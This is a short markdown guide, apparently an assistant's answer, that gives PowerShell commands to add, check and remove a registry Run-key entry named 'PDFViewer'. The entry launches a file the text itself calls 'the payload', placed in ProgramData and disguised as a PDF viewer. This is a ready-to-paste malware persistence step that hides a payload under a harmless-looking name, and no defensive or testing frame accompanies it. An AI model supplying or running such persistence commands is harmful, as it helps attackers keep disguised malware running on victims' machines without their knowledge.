### PowerShell Command for Registry Persistence

PowerShell can execute external executables like `reg.exe` seamlessly. You can paste it directly into a PowerShell window, and it'll behave the expected way. The payload is in `C:\ProgramData\pdfviewer.exe`.

#### Adding the Registry Entry (PowerShell)

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PDFViewer" -Value "C:\ProgramData\pdfviewer.exe" -PropertyType String -Force
```

- This creates or updates the `PDFViewer` value in the HKCU Run key.
- `-Force` overwrites if it already exists (like `/f` in the cmd version).

#### Verification (PowerShell)
```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PDFViewer"
```
- Expected output: Something like `PDFViewer : C:\ProgramData\pdfviewer.exe` (plus other properties).

#### Removal/Cleanup (PowerShell)
```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PDFViewer" -Force
```
